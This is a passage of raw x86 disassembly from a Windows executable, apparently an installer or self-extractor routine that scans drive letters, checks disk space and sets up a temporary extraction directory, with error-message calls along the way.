  40552f:	e8 94 03 00 00       	call   0x4058c8
  405534:	33 ff                	xor    %edi,%edi
  405536:	47                   	inc    %edi
  405537:	85 c0                	test   %eax,%eax
  405539:	75 12                	jne    0x40554d
  40553b:	53                   	push   %ebx
  40553c:	56                   	push   %esi
  40553d:	ff 15 b4 a0 40 00    	call   *0x40a0b4
  405543:	85 c0                	test   %eax,%eax
  405545:	74 30                	je     0x405577
  405547:	89 3d 20 8a 40 00    	mov    %edi,0x408a20
  40554d:	8b 55 08             	mov    0x8(%ebp),%edx
  405550:	85 d2                	test   %edx,%edx
  405552:	74 31                	je     0x405585
  405554:	53                   	push   %ebx
  405555:	8b ce                	mov    %esi,%ecx
  405557:	e8 21 04 00 00       	call   0x40597d
  40555c:	85 c0                	test   %eax,%eax
  40555e:	75 25                	jne    0x405585
  405560:	39 1d 20 8a 40 00    	cmp    %ebx,0x408a20
  405566:	74 19                	je     0x405581
  405568:	56                   	push   %esi
  405569:	89 1d 20 8a 40 00    	mov    %ebx,0x408a20
  40556f:	ff 15 a8 a0 40 00    	call   *0x40a0a8
  405575:	eb 0a                	jmp    0x405581
  405577:	e8 09 0d 00 00       	call   0x406285
  40557c:	a3 24 91 40 00       	mov    %eax,0x409124
  405581:	33 c0                	xor    %eax,%eax
  405583:	eb 08                	jmp    0x40558d
  405585:	89 1d 24 91 40 00    	mov    %ebx,0x409124
  40558b:	8b c7                	mov    %edi,%eax
  40558d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405590:	5f                   	pop    %edi
  405591:	5e                   	pop    %esi
  405592:	33 cd                	xor    %ebp,%ecx
  405594:	5b                   	pop    %ebx
  405595:	e8 46 17 00 00       	call   0x406ce0
  40559a:	8b e5                	mov    %ebp,%esp
  40559c:	5d                   	pop    %ebp
  40559d:	c2 04 00             	ret    $0x4
  4055a0:	8b ff                	mov    %edi,%edi
  4055a2:	55                   	push   %ebp
  4055a3:	8b ec                	mov    %esp,%ebp
  4055a5:	81 ec 08 01 00 00    	sub    $0x108,%esp
  4055ab:	a1 04 80 40 00       	mov    0x408004,%eax
  4055b0:	33 c5                	xor    %ebp,%eax
  4055b2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4055b5:	53                   	push   %ebx
  4055b6:	56                   	push   %esi
  4055b7:	57                   	push   %edi
  4055b8:	33 db                	xor    %ebx,%ebx
  4055ba:	33 d2                	xor    %edx,%edx
  4055bc:	53                   	push   %ebx
  4055bd:	b9 ec 12 40 00       	mov    $0x4012ec,%ecx
  4055c2:	e8 c8 f0 ff ff       	call   0x40468f
  4055c7:	8b f8                	mov    %eax,%edi
  4055c9:	8d 4f 01             	lea    0x1(%edi),%ecx
  4055cc:	51                   	push   %ecx
  4055cd:	6a 40                	push   $0x40
  4055cf:	ff 15 50 a1 40 00    	call   *0x40a150
  4055d5:	8b f0                	mov    %eax,%esi
  4055d7:	85 f6                	test   %esi,%esi
  4055d9:	75 22                	jne    0x4055fd
  4055db:	53                   	push   %ebx
  4055dc:	6a 10                	push   $0x10
  4055de:	53                   	push   %ebx
  4055df:	53                   	push   %ebx
  4055e0:	ba b5 04 00 00       	mov    $0x4b5,%edx
  4055e5:	33 c9                	xor    %ecx,%ecx
  4055e7:	e8 cd ee ff ff       	call   0x4044b9
  4055ec:	e8 94 0c 00 00       	call   0x406285
  4055f1:	a3 24 91 40 00       	mov    %eax,0x409124
  4055f6:	33 c0                	xor    %eax,%eax
  4055f8:	e9 ba 02 00 00       	jmp    0x4058b7
  4055fd:	57                   	push   %edi
  4055fe:	8b d6                	mov    %esi,%edx
  405600:	b9 ec 12 40 00       	mov    $0x4012ec,%ecx
  405605:	e8 85 f0 ff ff       	call   0x40468f
  40560a:	85 c0                	test   %eax,%eax
  40560c:	75 24                	jne    0x405632
  40560e:	53                   	push   %ebx
  40560f:	6a 10                	push   $0x10
  405611:	53                   	push   %ebx
  405612:	53                   	push   %ebx
  405613:	ba b1 04 00 00       	mov    $0x4b1,%edx
  405618:	33 c9                	xor    %ecx,%ecx
  40561a:	e8 9a ee ff ff       	call   0x4044b9
  40561f:	56                   	push   %esi
  405620:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  405626:	c7 05 24 91 40 00 14 	movl   $0x80070714,0x409124
  40562d:	07 07 80 
  405630:	eb c4                	jmp    0x4055f6
  405632:	68 c0 12 40 00       	push   $0x4012c0
  405637:	56                   	push   %esi
  405638:	ff 15 d4 a0 40 00    	call   *0x40a0d4
  40563e:	33 ff                	xor    %edi,%edi
  405640:	47                   	inc    %edi
  405641:	85 c0                	test   %eax,%eax
  405643:	75 06                	jne    0x40564b
  405645:	89 3d 30 9a 40 00    	mov    %edi,0x409a30
  40564b:	56                   	push   %esi
  40564c:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  405652:	a0 3e 8b 40 00       	mov    0x408b3e,%al
  405657:	84 c0                	test   %al,%al
  405659:	74 3b                	je     0x405696
  40565b:	3c 5c                	cmp    $0x5c,%al
  40565d:	75 0a                	jne    0x405669
  40565f:	38 05 3f 8b 40 00    	cmp    %al,0x408b3f
  405665:	8b c3                	mov    %ebx,%eax
  405667:	74 02                	je     0x40566b
  405669:	8b c7                	mov    %edi,%eax
  40566b:	50                   	push   %eax
  40566c:	33 d2                	xor    %edx,%edx
  40566e:	b9 3e 8b 40 00       	mov    $0x408b3e,%ecx
  405673:	e8 ef fd ff ff       	call   0x405467
  405678:	85 c0                	test   %eax,%eax
  40567a:	0f 85 1b 02 00 00    	jne    0x40589b
  405680:	53                   	push   %ebx
  405681:	6a 10                	push   $0x10
  405683:	53                   	push   %ebx
  405684:	53                   	push   %ebx
  405685:	ba be 04 00 00       	mov    $0x4be,%edx
  40568a:	33 c9                	xor    %ecx,%ecx
  40568c:	e8 28 ee ff ff       	call   0x4044b9
  405691:	e9 60 ff ff ff       	jmp    0x4055f6
  405696:	39 1d 24 8a 40 00    	cmp    %ebx,0x408a24
  40569c:	0f 85 fd 01 00 00    	jne    0x40589f
  4056a2:	39 1d 30 9a 40 00    	cmp    %ebx,0x409a30
  4056a8:	0f 85 f1 01 00 00    	jne    0x40589f
  4056ae:	be e4 91 40 00       	mov    $0x4091e4,%esi
  4056b3:	56                   	push   %esi
  4056b4:	68 04 01 00 00       	push   $0x104
  4056b9:	ff 15 00 a1 40 00    	call   *0x40a100
  4056bf:	85 c0                	test   %eax,%eax
  4056c1:	74 30                	je     0x4056f3
  4056c3:	6a 03                	push   $0x3
  4056c5:	8b d7                	mov    %edi,%edx
  4056c7:	8b ce                	mov    %esi,%ecx
  4056c9:	e8 99 fd ff ff       	call   0x405467
  4056ce:	85 c0                	test   %eax,%eax
  4056d0:	0f 85 c5 01 00 00    	jne    0x40589b
  4056d6:	8b ce                	mov    %esi,%ecx
  4056d8:	e8 53 cf ff ff       	call   0x402630
  4056dd:	85 c0                	test   %eax,%eax
  4056df:	75 12                	jne    0x4056f3
  4056e1:	57                   	push   %edi
  4056e2:	8b d7                	mov    %edi,%edx
  4056e4:	8b ce                	mov    %esi,%ecx
  4056e6:	e8 7c fd ff ff       	call   0x405467
  4056eb:	85 c0                	test   %eax,%eax
  4056ed:	0f 85 a8 01 00 00    	jne    0x40589b
  4056f3:	51                   	push   %ecx
  4056f4:	68 a4 13 40 00       	push   $0x4013a4
  4056f9:	51                   	push   %ecx
  4056fa:	ba 04 01 00 00       	mov    $0x104,%edx
  4056ff:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  405705:	e8 77 c0 ff ff       	call   0x401781
  40570a:	80 bd f8 fe ff ff 5a 	cmpb   $0x5a,-0x108(%ebp)
  405711:	0f 8f 55 01 00 00    	jg     0x40586c
  405717:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  40571d:	50                   	push   %eax
  40571e:	ff 15 d0 a0 40 00    	call   *0x40a0d0
  405724:	8b f0                	mov    %eax,%esi
  405726:	83 fe 06             	cmp    $0x6,%esi
  405729:	74 05                	je     0x405730
  40572b:	83 fe 03             	cmp    $0x3,%esi
  40572e:	75 12                	jne    0x405742
  405730:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  405736:	50                   	push   %eax
  405737:	ff 15 70 a0 40 00    	call   *0x40a070
  40573d:	83 f8 ff             	cmp    $0xffffffff,%eax
  405740:	75 3c                	jne    0x40577e
  405742:	83 fe 02             	cmp    $0x2,%esi
  405745:	75 24                	jne    0x40576b
  405747:	8a 85 f8 fe ff ff    	mov    -0x108(%ebp),%al
  40574d:	3c 41                	cmp    $0x41,%al
  40574f:	74 20                	je     0x405771
  405751:	3c 42                	cmp    $0x42,%al
  405753:	74 1c                	je     0x405771
  405755:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  40575b:	e8 f2 11 00 00       	call   0x406952
  405760:	85 c0                	test   %eax,%eax
  405762:	74 07                	je     0x40576b
  405764:	3d 00 90 01 00       	cmp    $0x19000,%eax
  405769:	73 13                	jae    0x40577e
  40576b:	8a 85 f8 fe ff ff    	mov    -0x108(%ebp),%al
  405771:	fe c0                	inc    %al
  405773:	88 85 f8 fe ff ff    	mov    %al,-0x108(%ebp)
  405779:	e9 e6 00 00 00       	jmp    0x405864
  40577e:	53                   	push   %ebx
  40577f:	6a 03                	push   $0x3
  405781:	5a                   	pop    %edx
  405782:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  405788:	e8 f0 01 00 00       	call   0x40597d
  40578d:	85 c0                	test   %eax,%eax
  40578f:	75 21                	jne    0x4057b2
  405791:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  405797:	e8 94 ce ff ff       	call   0x402630
  40579c:	85 c0                	test   %eax,%eax
  40579e:	75 cb                	jne    0x40576b
  4057a0:	53                   	push   %ebx
  4057a1:	8b d7                	mov    %edi,%edx
  4057a3:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  4057a9:	e8 cf 01 00 00       	call   0x40597d
  4057ae:	85 c0                	test   %eax,%eax
  4057b0:	74 b9                	je     0x40576b
  4057b2:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  4057b8:	e8 73 ce ff ff       	call   0x402630
  4057bd:	85 c0                	test   %eax,%eax
  4057bf:	74 12                	je     0x4057d3
  4057c1:	68 04 01 00 00       	push   $0x104
  4057c6:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  4057cc:	50                   	push   %eax
  4057cd:	ff 15 94 a0 40 00    	call   *0x40a094
  4057d3:	68 a8 13 40 00       	push   $0x4013a8
  4057d8:	ba 04 01 00 00       	mov    $0x104,%edx
  4057dd:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  4057e3:	e8 a2 0d 00 00       	call   0x40658a
  4057e8:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  4057ee:	50                   	push   %eax
  4057ef:	ff 15 70 a0 40 00    	call   *0x40a070
  4057f5:	83 f8 ff             	cmp    $0xffffffff,%eax
  4057f8:	75 10                	jne    0x40580a
  4057fa:	53                   	push   %ebx
  4057fb:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  405801:	50                   	push   %eax
  405802:	ff 15 b4 a0 40 00    	call   *0x40a0b4
  405808:	eb 03                	jmp    0x40580d
  40580a:	83 e0 10             	and    $0x10,%eax
  40580d:	85 c0                	test   %eax,%eax
  40580f:	75 16                	jne    0x405827
  405811:	8a 85 f8 fe ff ff    	mov    -0x108(%ebp),%al
  405817:	fe c0                	inc    %al
  405819:	88 9d fb fe ff ff    	mov    %bl,-0x105(%ebp)
  40581f:	88 85 f8 fe ff ff    	mov    %al,-0x108(%ebp)
  405825:	eb 3d                	jmp    0x405864
  405827:	6a 02                	push   $0x2
  405829:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  40582f:	50                   	push   %eax
  405830:	ff 15 98 a0 40 00    	call   *0x40a098
  405836:	51                   	push   %ecx
  405837:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  40583d:	be e4 91 40 00       	mov    $0x4091e4,%esi
  405842:	50                   	push   %eax
  405843:	51                   	push   %ecx
  405844:	ba 04 01 00 00       	mov    $0x104,%edx
  405849:	8b ce                	mov    %esi,%ecx
  40584b:	e8 31 bf ff ff       	call   0x401781
  405850:	53                   	push   %ebx
  405851:	8b d7                	mov    %edi,%edx
  405853:	8b ce                	mov    %esi,%ecx
  405855:	e8 0d fc ff ff       	call   0x405467
  40585a:	85 c0                	test   %eax,%eax
  40585c:	75 3d                	jne    0x40589b
  40585e:	8a 85 f8 fe ff ff    	mov    -0x108(%ebp),%al
  405864:	3c 5a                	cmp    $0x5a,%al
  405866:	0f 8e ab fe ff ff    	jle    0x405717
  40586c:	68 04 01 00 00       	push   $0x104
  405871:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  405877:	50                   	push   %eax
  405878:	ff 15 94 a0 40 00    	call   *0x40a094
  40587e:	6a 04                	push   $0x4
  405880:	6a 03                	push   $0x3
  405882:	5a                   	pop    %edx
  405883:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  405889:	e8 ef 00 00 00       	call   0x40597d
  40588e:	85 c0                	test   %eax,%eax
  405890:	0f 85 5d fe ff ff    	jne    0x4056f3
  405896:	e9 5b fd ff ff       	jmp    0x4055f6
  40589b:	8b c7                	mov    %edi,%eax
  40589d:	eb 18                	jmp    0x4058b7
  40589f:	53                   	push   %ebx
  4058a0:	53                   	push   %ebx
  4058a1:	68 10 32 40 00       	push   $0x403210
  4058a6:	53                   	push   %ebx
  4058a7:	ba d2 07 00 00       	mov    $0x7d2,%edx
  4058ac:	e8 66 0c 00 00       	call   0x406517
  4058b1:	f7 d8                	neg    %eax
  4058b3:	1b c0                	sbb    %eax,%eax
  4058b5:	f7 d8                	neg    %eax
  4058b7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4058ba:	5f                   	pop    %edi
  4058bb:	5e                   	pop    %esi
  4058bc:	33 cd                	xor    %ebp,%ecx
  4058be:	5b                   	pop    %ebx
  4058bf:	e8 1c 14 00 00       	call   0x406ce0
  4058c4:	8b e5                	mov    %ebp,%esp
  4058c6:	5d                   	pop    %ebp
  4058c7:	c3                   	ret
  4058c8:	8b ff                	mov    %edi,%edi
  4058ca:	55                   	push   %ebp
  4058cb:	8b ec                	mov    %esp,%ebp
  4058cd:	51                   	push   %ecx
  4058ce:	53                   	push   %ebx
  4058cf:	56                   	push   %esi
  4058d0:	57                   	push   %edi
  4058d1:	8b f9                	mov    %ecx,%edi
  4058d3:	8b d7                	mov    %edi,%edx
  4058d5:	8d 4a 01             	lea    0x1(%edx),%ecx
  4058d8:	8a 02                	mov    (%edx),%al
  4058da:	42                   	inc    %edx
  4058db:	84 c0                	test   %al,%al
  4058dd:	75 f9                	jne    0x4058d8
  4058df:	2b d1                	sub    %ecx,%edx
  4058e1:	8d 72 14             	lea    0x14(%edx),%esi
  4058e4:	56                   	push   %esi
  4058e5:	6a 40                	push   $0x40
  4058e7:	ff 15 50 a1 40 00    	call   *0x40a150
  4058ed:	8b d8                	mov    %eax,%ebx
  4058ef:	85 db                	test   %ebx,%ebx
  4058f1:	75 26                	jne    0x405919
  4058f3:	33 f6                	xor    %esi,%esi
  4058f5:	ba b5 04 00 00       	mov    $0x4b5,%edx
  4058fa:	56                   	push   %esi
  4058fb:	6a 10                	push   $0x10
  4058fd:	56                   	push   %esi
  4058fe:	56                   	push   %esi
  4058ff:	33 c9                	xor    %ecx,%ecx
  405901:	e8 b3 eb ff ff       	call   0x4044b9
  405906:	e8 7a 09 00 00       	call   0x406285
  40590b:	a3 24 91 40 00       	mov    %eax,0x409124
  405910:	33 c0                	xor    %eax,%eax
  405912:	5f                   	pop    %edi
  405913:	5e                   	pop    %esi
  405914:	5b                   	pop    %ebx
  405915:	8b e5                	mov    %ebp,%esp
  405917:	5d                   	pop    %ebp
  405918:	c3                   	ret
  405919:	57                   	push   %edi
  40591a:	8b d6                	mov    %esi,%edx
  40591c:	8b cb                	mov    %ebx,%ecx
  40591e:	e8 5d bd ff ff       	call   0x401680
  405923:	68 b8 13 40 00       	push   $0x4013b8
  405928:	8b d6                	mov    %esi,%edx
  40592a:	8b cb                	mov    %ebx,%ecx
  40592c:	e8 59 0c 00 00       	call   0x40658a
  405931:	33 f6                	xor    %esi,%esi
  405933:	56                   	push   %esi
  405934:	68 80 00 00 04       	push   $0x4000080
  405939:	6a 01                	push   $0x1
  40593b:	56                   	push   %esi
  40593c:	56                   	push   %esi
  40593d:	68 00 00 00 40       	push   $0x40000000
  405942:	53                   	push   %ebx
  405943:	ff 15 08 a1 40 00    	call   *0x40a108
  405949:	53                   	push   %ebx
  40594a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40594d:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  405953:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405956:	83 f8 ff             	cmp    $0xffffffff,%eax
  405959:	74 ab                	je     0x405906
  40595b:	50                   	push   %eax
  40595c:	ff 15 88 a0 40 00    	call   *0x40a088
  405962:	57                   	push   %edi
  405963:	ff 15 70 a0 40 00    	call   *0x40a070
  405969:	83 f8 ff             	cmp    $0xffffffff,%eax
  40596c:	74 98                	je     0x405906
  40596e:	a8 10                	test   $0x10,%al
  405970:	74 94                	je     0x405906
  405972:	33 c0                	xor    %eax,%eax
  405974:	89 35 24 91 40 00    	mov    %esi,0x409124
  40597a:	40                   	inc    %eax
  40597b:	eb 95                	jmp    0x405912
  40597d:	8b ff                	mov    %edi,%edi
  40597f:	55                   	push   %ebp
  405980:	8b ec                	mov    %esp,%ebp
  405982:	81 ec 30 03 00 00    	sub    $0x330,%esp
  405988:	a1 04 80 40 00       	mov    0x408004,%eax
  40598d:	33 c5                	xor    %ebp,%eax
  40598f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405992:	53                   	push   %ebx
  405993:	56                   	push   %esi
  405994:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
  40599a:	89 95 e0 fc ff ff    	mov    %edx,-0x320(%ebp)
  4059a0:	50                   	push   %eax
  4059a1:	68 04 01 00 00       	push   $0x104
  4059a6:	8b f1                	mov    %ecx,%esi
  4059a8:	ff 15 f0 a0 40 00    	call   *0x40a0f0
  4059ae:	56                   	push   %esi
  4059af:	ff 15 fc a0 40 00    	call   *0x40a0fc
  4059b5:	33 db                	xor    %ebx,%ebx
  4059b7:	85 c0                	test   %eax,%eax
  4059b9:	75 22                	jne    0x4059dd
  4059bb:	53                   	push   %ebx
  4059bc:	6a 10                	push   $0x10
  4059be:	53                   	push   %ebx
  4059bf:	53                   	push   %ebx
  4059c0:	ba bc 04 00 00       	mov    $0x4bc,%edx
  4059c5:	33 c9                	xor    %ecx,%ecx
  4059c7:	e8 ed ea ff ff       	call   0x4044b9
  4059cc:	e8 b4 08 00 00       	call   0x406285
  4059d1:	a3 24 91 40 00       	mov    %eax,0x409124
  4059d6:	33 c0                	xor    %eax,%eax
  4059d8:	e9 28 02 00 00       	jmp    0x405c05
  4059dd:	57                   	push   %edi
  4059de:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  4059e4:	89 9d e8 fc ff ff    	mov    %ebx,-0x318(%ebp)
  4059ea:	50                   	push   %eax
  4059eb:	8d 85 e4 fc ff ff    	lea    -0x31c(%ebp),%eax
  4059f1:	89 9d ec fc ff ff    	mov    %ebx,-0x314(%ebp)
  4059f7:	50                   	push   %eax
  4059f8:	8d 85 ec fc ff ff    	lea    -0x314(%ebp),%eax
  4059fe:	89 9d e4 fc ff ff    	mov    %ebx,-0x31c(%ebp)
  405a04:	50                   	push   %eax
  405a05:	8d 85 e8 fc ff ff    	lea    -0x318(%ebp),%eax
  405a0b:	89 9d dc fc ff ff    	mov    %ebx,-0x324(%ebp)
  405a11:	50                   	push   %eax
  405a12:	53                   	push   %ebx
  405a13:	ff 15 5c a1 40 00    	call   *0x40a15c
  405a19:	85 c0                	test   %eax,%eax
  405a1b:	0f 84 80 01 00 00    	je     0x405ba1
  405a21:	8b 85 ec fc ff ff    	mov    -0x314(%ebp),%eax
  405a27:	0f af 85 e8 fc ff ff 	imul   -0x318(%ebp),%eax
  405a2e:	68 00 04 00 00       	push   $0x400
  405a33:	ff b5 e4 fc ff ff    	push   -0x31c(%ebp)
  405a39:	50                   	push   %eax
  405a3a:	89 85 d8 fc ff ff    	mov    %eax,-0x328(%ebp)
  405a40:	ff 15 58 a1 40 00    	call   *0x40a158
  405a46:	8b f8                	mov    %eax,%edi
  405a48:	85 ff                	test   %edi,%edi
  405a4a:	0f 84 51 01 00 00    	je     0x405ba1
  405a50:	53                   	push   %ebx
  405a51:	53                   	push   %ebx
  405a52:	8d 85 d4 fc ff ff    	lea    -0x32c(%ebp),%eax
  405a58:	50                   	push   %eax
  405a59:	8d 85 d0 fc ff ff    	lea    -0x330(%ebp),%eax
  405a5f:	50                   	push   %eax
  405a60:	53                   	push   %ebx
  405a61:	53                   	push   %ebx
  405a62:	53                   	push   %ebx
  405a63:	53                   	push   %ebx
  405a64:	ff 15 e8 a0 40 00    	call   *0x40a0e8
  405a6a:	85 c0                	test   %eax,%eax
  405a6c:	75 47                	jne    0x405ab5
  405a6e:	bf 00 02 00 00       	mov    $0x200,%edi
  405a73:	8d 85 f0 fc ff ff    	lea    -0x310(%ebp),%eax
  405a79:	57                   	push   %edi
  405a7a:	53                   	push   %ebx
  405a7b:	50                   	push   %eax
  405a7c:	e8 2e 18 00 00       	call   0x4072af
  405a81:	83 c4 0c             	add    $0xc,%esp
  405a84:	e8 fc 07 00 00       	call   0x406285
  405a89:	53                   	push   %ebx
  405a8a:	a3 24 91 40 00       	mov    %eax,0x409124
  405a8f:	8d 85 f0 fc ff ff    	lea    -0x310(%ebp),%eax
  405a95:	57                   	push   %edi
  405a96:	50                   	push   %eax
  405a97:	53                   	push   %ebx
  405a98:	ff 15 6c a0 40 00    	call   *0x40a06c
  405a9e:	50                   	push   %eax
  405a9f:	53                   	push   %ebx
  405aa0:	68 00 10 00 00       	push   $0x1000
  405aa5:	ff 15 38 a1 40 00    	call   *0x40a138
  405aab:	ba f9 04 00 00       	mov    $0x4f9,%edx
  405ab0:	e9 2e 01 00 00       	jmp    0x405be3
  405ab5:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
  405abb:	50                   	push   %eax
  405abc:	ff 15 fc a0 40 00    	call   *0x40a0fc
  405ac2:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  405ac5:	6a 06                	push   $0x6
  405ac7:	8b c1                	mov    %ecx,%eax
  405ac9:	5a                   	pop    %edx
  405aca:	2b f0                	sub    %eax,%esi
  405acc:	8d 42 fc             	lea    -0x4(%edx),%eax
  405acf:	85 c0                	test   %eax,%eax
  405ad1:	74 0f                	je     0x405ae2
  405ad3:	8a 04 0e             	mov    (%esi,%ecx,1),%al
  405ad6:	84 c0                	test   %al,%al
  405ad8:	74 08                	je     0x405ae2
  405ada:	88 01                	mov    %al,(%ecx)
  405adc:	41                   	inc    %ecx
  405add:	83 ea 01             	sub    $0x1,%edx
  405ae0:	75 ea                	jne    0x405acc
  405ae2:	85 d2                	test   %edx,%edx
  405ae4:	75 01                	jne    0x405ae7
  405ae6:	49                   	dec    %ecx
  405ae7:	6a 08                	push   $0x8
  405ae9:	88 19                	mov    %bl,(%ecx)
  405aeb:	ba 00 02 00 00       	mov    $0x200,%edx
  405af0:	8b 8d d8 fc ff ff    	mov    -0x328(%ebp),%ecx
  405af6:	8b c3                	mov    %ebx,%eax
  405af8:	5e                   	pop    %esi
  405af9:	3b ca                	cmp    %edx,%ecx
  405afb:	74 08                	je     0x405b05
  405afd:	03 d2                	add    %edx,%edx
  405aff:	40                   	inc    %eax
  405b00:	66 3b c6             	cmp    %si,%ax
  405b03:	72 f4                	jb     0x405af9
  405b05:	66 3b c6             	cmp    %si,%ax
  405b08:	75 16                	jne    0x405b20
  405b0a:	53                   	push   %ebx
  405b0b:	6a 10                	push   $0x10
  405b0d:	53                   	push   %ebx
  405b0e:	53                   	push   %ebx
  405b0f:	ba c5 04 00 00       	mov    $0x4c5,%edx
  405b14:	33 c9                	xor    %ecx,%ecx
  405b16:	e8 9e e9 ff ff       	call   0x4044b9
  405b1b:	e9 e2 00 00 00       	jmp    0x405c02
  405b20:	f6 05 34 9a 40 00 08 	testb  $0x8,0x409a34
  405b27:	74 29                	je     0x405b52
  405b29:	f7 85 d4 fc ff ff 00 	testl  $0x8000,-0x32c(%ebp)
  405b30:	80 00 00 
  405b33:	74 1d                	je     0x405b52
  405b35:	8b 0d 38 9a 40 00    	mov    0x409a38,%ecx
  405b3b:	0f b7 c0             	movzwl %ax,%eax
  405b3e:	c1 e9 02             	shr    $0x2,%ecx
  405b41:	8b 14 85 e0 89 40 00 	mov    0x4089e0(,%eax,4),%edx
  405b48:	03 d2                	add    %edx,%edx
  405b4a:	03 0d 38 9a 40 00    	add    0x409a38,%ecx
  405b50:	eb 10                	jmp    0x405b62
  405b52:	8b 0d 38 9a 40 00    	mov    0x409a38,%ecx
  405b58:	0f b7 c0             	movzwl %ax,%eax
  405b5b:	8b 14 85 e0 89 40 00 	mov    0x4089e0(,%eax,4),%edx
  405b62:	8b 85 e0 fc ff ff    	mov    -0x320(%ebp),%eax
  405b68:	83 e0 03             	and    $0x3,%eax
  405b6b:	3c 03                	cmp    $0x3,%al
  405b6d:	75 07                	jne    0x405b76
  405b6f:	8d 04 11             	lea    (%ecx,%edx,1),%eax
  405b72:	3b c7                	cmp    %edi,%eax
  405b74:	eb 0f                	jmp    0x405b85
  405b76:	f6 85 e0 fc ff ff 01 	testb  $0x1,-0x320(%ebp)
  405b7d:	74 04                	je     0x405b83
  405b7f:	3b d7                	cmp    %edi,%edx
  405b81:	eb 02                	jmp    0x405b85
  405b83:	3b cf                	cmp    %edi,%ecx
  405b85:	76 0f                	jbe    0x405b96
  405b87:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405b8a:	50                   	push   %eax
  405b8b:	51                   	push   %ecx
  405b8c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405b8f:	e8 f7 ca ff ff       	call   0x40268b
  405b94:	eb 6e                	jmp    0x405c04
  405b96:	33 c0                	xor    %eax,%eax
  405b98:	89 1d 24 91 40 00    	mov    %ebx,0x409124
  405b9e:	40                   	inc    %eax
  405b9f:	eb 63                	jmp    0x405c04
  405ba1:	bf 00 02 00 00       	mov    $0x200,%edi
  405ba6:	8d 85 f0 fc ff ff    	lea    -0x310(%ebp),%eax
  405bac:	57                   	push   %edi
  405bad:	53                   	push   %ebx
  405bae:	50                   	push   %eax
  405baf:	e8 fb 16 00 00       	call   0x4072af
  405bb4:	83 c4 0c             	add    $0xc,%esp
  405bb7:	e8 c9 06 00 00       	call   0x406285
  405bbc:	53                   	push   %ebx
  405bbd:	a3 24 91 40 00       	mov    %eax,0x409124
  405bc2:	8d 85 f0 fc ff ff    	lea    -0x310(%ebp),%eax
  405bc8:	57                   	push   %edi
  405bc9:	50                   	push   %eax
  405bca:	53                   	push   %ebx
  405bcb:	ff 15 6c a0 40 00    	call   *0x40a06c
  405bd1:	50                   	push   %eax
  405bd2:	53                   	push   %ebx
  405bd3:	68 00 10 00 00       	push   $0x1000
  405bd8:	ff 15 38 a1 40 00    	call   *0x40a138
  405bde:	ba b0 04 00 00       	mov    $0x4b0,%edx
  405be3:	53                   	push   %ebx
  405be4:	6a 10                	push   $0x10
  405be6:	8d 85 f0 fc ff ff    	lea    -0x310(%ebp),%eax
  405bec:	33 c9                	xor    %ecx,%ecx
  405bee:	50                   	push   %eax
  405bef:	56                   	push   %esi
  405bf0:	e8 c4 e8 ff ff       	call   0x4044b9
  405bf5:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
  405bfb:	50                   	push   %eax
  405bfc:	ff 15 fc a0 40 00    	call   *0x40a0fc
  405c02:	33 c0                	xor    %eax,%eax
  405c04:	5f                   	pop    %edi
  405c05:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405c08:	5e                   	pop    %esi
  405c09:	33 cd                	xor    %ebp,%ecx
  405c0b:	5b                   	pop    %ebx
  405c0c:	e8 cf 10 00 00       	call   0x406ce0
  405c11:	8b e5                	mov    %ebp,%esp
  405c13:	5d                   	pop    %ebp
  405c14:	c2 04 00             	ret    $0x4
  405c17:	8b ff                	mov    %edi,%edi
  405c19:	55                   	push   %ebp
  405c1a:	8b ec                	mov    %esp,%ebp
  405c1c:	51                   	push   %ecx
  405c1d:	56                   	push   %esi
  405c1e:	57                   	push   %edi
  405c1f:	8b f9                	mov    %ecx,%edi
  405c21:	89 55 fc             	mov    %edx,-0x4(%ebp)
  405c24:	33 f6                	xor    %esi,%esi
  405c26:	8a 07                	mov    (%edi),%al
  405c28:	eb 1c                	jmp    0x405c46
  405c2a:	3c 20                	cmp    $0x20,%al
  405c2c:	74 14                	je     0x405c42
  405c2e:	3c 09                	cmp    $0x9,%al
  405c30:	74 10                	je     0x405c42
  405c32:	3c 0d                	cmp    $0xd,%al
  405c34:	74 0c                	je     0x405c42
  405c36:	3c 0a                	cmp    $0xa,%al
  405c38:	74 08                	je     0x405c42
  405c3a:	3c 0b                	cmp    $0xb,%al
  405c3c:	74 04                	je     0x405c42
  405c3e:	3c 0c                	cmp    $0xc,%al
  405c40:	75 08                	jne    0x405c4a
  405c42:	46                   	inc    %esi
  405c43:	8a 04 3e             	mov    (%esi,%edi,1),%al
  405c46:	84 c0                	test   %al,%al
  405c48:	75 e0                	jne    0x405c2a
  405c4a:	8d 14 3e             	lea    (%esi,%edi,1),%edx
  405c4d:	80 3a 00             	cmpb   $0x0,(%edx)
  405c50:	75 04                	jne    0x405c56
